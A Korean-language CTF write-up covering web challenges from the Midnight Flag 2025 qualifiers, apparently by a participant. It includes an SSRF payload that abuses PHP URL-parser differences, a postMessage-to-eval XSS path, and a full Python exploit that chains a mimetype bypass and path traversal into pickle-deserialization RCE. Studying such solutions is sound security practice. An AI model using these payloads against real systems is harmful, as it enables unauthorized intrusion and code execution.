---
title: Midnight Flag CTF Quals Write Up
description: Midnight Flag CTF Quals Write Up(web)
author: goldleo1
date: 2025-04-22 12:00:00 +0800
categories: [ctf]
tags: [ctf, "2025"]
pin: false
---

## Midnight Flag CTF Quals

**otnws**랑 함께 본선간다.

![alt text](/assets/img/2025-04-22 23-04-37.png)

[Archive - github](https://github.com/MidnightFlag/qualifiers-challenges-2025)

## WEB

### BeatIt

> The Rules (That You Must Obey) There are 20 sticks on the table. They stare at you. You stare back. The bot always starts. No negotiations. This is my game, my rules 😈. On your turn, you can remove 1, 2, or 3 sticks. Choose wisely, mortal. The player who takes the last stick LOSES. Meaning, if you pick up that final lonely stick… it's Game Over. And the bot laughs at you. Probably.

Frontend에서만 검증이 존재한다.
Burp Suite로 요청을 잡아서 값을 변조해 주면 된다.

### Disparity

> I only trust what I see and, guess what ? I don't see any vulnerability in my app.

```conf
<VirtualHost *:80>
    DocumentRoot /var/www/html/front
</VirtualHost>

<VirtualHost *:8080>
    DocumentRoot /var/www/html/back
    <Location />
        Require ip 127.0.0.1
    </Location>
</VirtualHost>

Listen 8080
```

back에 접근하기 위해서는 로컬 요청이어야한다.

{: file="flag.php" }

```php
<?php

if ($_SERVER['HTTP_HOST'] === "localhost:8080"){
    echo getenv('FLAG');
} else {
    echo "You are not allowed to do that";
}
?>
```

backend에 가면 플래그를 준다.

```php
<?php

ini_set("default_socket_timeout", 5);

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die("/url.php is only accessible with POST");
}

if (!isset($_POST['url']) || strlen($_POST['url']) === 0) {
    die("Parameter 'url' is mandatory");
}

$url = $_POST['url'];

try {
    $parsed = parse_url($url);
    var_dump($parsed);
} catch (Exception $e) {
    die("Failed to parse URL");
}

if (strlen($parsed['host']) === 0) {
    die("Host can not be empty");
}

if ($parsed['scheme'] !== "http") {
    die("HTTP is the only option");
}

// Prevent DNS rebinding
try {
    $ip = gethostbyname($parsed['host']);
    var_dump($ip, 'ip');
} catch (Exception $e) {
    die("Failed to resolve IP");
}

// Prevent from fetching localhost
if (preg_match("/^127\..*/", $ip) || $ip === "0.0.0.0") {
    die("Can't fetch localhost");
}

$url = str_replace($parsed['host'], $ip, $url);
var_dump($url);
// Fetch url
try {
    ob_start();
    $len_content = readfile($url);
    $content = ob_get_clean();
} catch (Exception $e) {
    die("Failed to request URL");
}

if ($len_content > 0) {
    echo $content;
} else {
    die("Empty reply from server");
}

?>w
```

Orange Tsai의 Blackhat발표글에 힌트가 존재한다.

![alt text](/assets/img/2025-04-22 23-13-31.png)

[A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

php에서 `parse_url`과 `readfile`이 요청을 처리하는 방식의 차이에서 취약점이 발생한다.

Payload : `http://localhost:8080:`

### postplayground_revenge

XSS & postmessage

`postplayground`는 언인텐이 터져서 One님이 바로 푸셨다.

![alt text](/assets/img/2025-04-23 12-02-06.png)

건우가 `exec_execute.html`에서 XSS를 터트리는 코드를 찾았다.

그런데 `static1.midnightflag.fr`에서 XSS가 발생하기 때문에 `localhost`에서 발생시키는 방법을 찾아야한다.

postMessage를 활용해서 풀 수 있다.

```html
<!-- render_frame.html -->
<script>
window.addEventListener("message", async (event) => {
    if(event.origin !== location.origin || event.origin == null) return;
    else {
        if(typeof(event.data) !== "object" || event.data.action === undefined || event.data.vars === undefined) {
            return;
        }
        switch(event.data.action) {
            case "load_variable": ...;
            case "load_scripts":
                        if(event.data.vars.srcs !== undefined && typeof(event.data.vars.srcs) === "object") {
                            let script_data;
                            let code;
                            let script_start = "###TO_EVAL###";
                            let script_end = "###EOF_EVAL###";
                            event.data.vars.srcs.forEach(async (element) => {
                                let script_data = await fetchData(location.origin+element, "GET", false);
                                if(script_data && script_data.indexOf(script_start) > -1 && script_data.indexOf(script_end) > -1) {
                                    code = script_data.split(script_start)[1].split(script_end)[0];
                                    await geval(code);
                                }
                            });
                        }
                        break;
        }
    }
}
</script>
```

`load_scripts`를 action으로 보내면 src에서 데이터를 가져와서 eval로 실행시켜준다.

그렇게 된다면 render_frame.html에서 XSS를 실행시킬 수 있다.

gg.


### (Upsolving) FuturUpload

작은 부분을 놓쳐서 익스를 못했다.

`/getflag`를 실행시켜 플래그를 얻을 수 있다.

```py
@files_api.route('/api/files/upload', methods=['POST'])
def upload_file():
    user = get_current_user()
    if not user:
        return jsonify({'status': 'error', 'message': 'Not authenticated'})

    folder = request.form.get('folder', '')
    filename = request.form.get('filename')
    content_b64 = request.form.get('content')

    if not filename or not content_b64:
        return jsonify({'status': 'error', 'message': 'Missing filename or content'})

    mimetype, _ = mimetypes.guess_type(filename)
    if mimetype not in ['image/png', 'image/jpeg']:
        return jsonify({'status': 'error', 'message': 'Invalid file type'})

    base_path = os.path.join(Config.UPLOAD_FOLDER, user[3])
    full_folder = os.path.normpath(os.path.join(base_path, folder))
    if not full_folder.startswith(base_path):
        return jsonify({'status': 'error', 'message': 'Invalid folder'})

    os.makedirs(full_folder, exist_ok=True)
    filepath = os.path.join(full_folder, filename)

    try:
        decoded = base64.b64decode(content_b64)
        if len(decoded) > 1_000_000:
            return jsonify({'status': 'error', 'message': 'File too large'})
        with open(filepath, 'wb') as f:
            f.write(decoded)
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'Error writing file: {str(e)}'})

    return jsonify({'status': 'ok'})
```

파일 업로드에서 mimetypes.guess_type()이 'image/png', 'image/jpeg'가 되어야 해서 임의의 확장자를 올릴 수 있다.

mimetypes에서는 path가 아니라 url로 처리하기 때문에 data:// 형식도 파싱한다.

```py
if scheme == 'data':
    comma = url.find(',')
    if comma < 0:
        # bad data URL
        return None, None
    semi = url.find(';', 0, comma)
    if semi >= 0:
        type = url[:semi]
    else:
        type = url[:comma]
    if '=' in type or '/' not in type:
        type = 'text/plain'
    return type, None
```

`if not full_folder.startswith(base_path):` 검증은 filename에서 path traversal을 해서 우회할 수 있다.

Payload : `data:image/jpeg,;/../../../../../app/flask_session/2029240f6d1128be89ddc32729463129`


[flask-session](https://github.com/pallets-eco/flask-session) -> Filesystem -> cachelib -> pickle 사용

pickle deserialization -> rce가 가능하다.

[CA CTF 2022: Exploiting Zip Slip and Pickle Deserialization - Acnologia Portal](https://www.hackthebox.com/blog/acnologia-portal-ca-ctf-2022-web-writeup)

캐시가 저장될 때 `md5(sid)`에 저장한다.

<br>

그러나 `SESSION_KEY_PREFIX = os.urandom(32).hex()`를 설정해서 파일명을 알 수 없다.

```py
_fs_count_file = "__wz_cache_count"
```

cachelib에는 파일 카운터가 존재하고, 이 값은 `md5("__wz_cache_count")`에 저장된다.

고정된 파일명을 사용하기 때문에 pickle로 rce할 수 있다.

Exploit

```py
import requests as req
import base64
import pickle
import struct

url = 'http://127.0.0.1:8000'

cookies = {'session': 'LbBrUxgxNI322Y0ePBBWW14fDr7mDbyL42Q0J216mUQ'}

with req.Session() as r:
    r.cookies.update(cookies)
    res = r.post(f'{url}/api/files/upload', data={'folder': '', 'filename': 'data:image/jpeg,;/../../../../../../', 'content':base64.b64encode(b'dummy')})
    uuid = res.json()['message'].split('/')[3]
    
    class RCE:
        def __reduce__(self):
            cmd = (f'__import__("os").system("/getflag > /app/user_files/{uuid}/hi")')
            return eval, (cmd,)

    payload = struct.pack("I", 0000) + pickle.dumps(RCE())
    print(payload)
    payload = base64.b64encode(payload).decode()

    res = r.post(f'{url}/api/files/upload', data={'folder': 'data:image/jpeg,;', 'filename': 'dummy.png', 'content':base64.b64encode(b'hi').decode()})
    print(res.text)
    while 1:
        res = r.post(f'{url}/api/files/upload', data={'folder': '', 'filename': 'data:image/jpeg,;/../../../../../app/flask_session/2029240f6d1128be89ddc32729463129', 'content':payload})
        print(res.status_code)
        res = r.post(f'{url}/api/files/download', data={'filename': 'hi'})
        print(res.text)
```

## Review

Web 문제가 재밌었다.
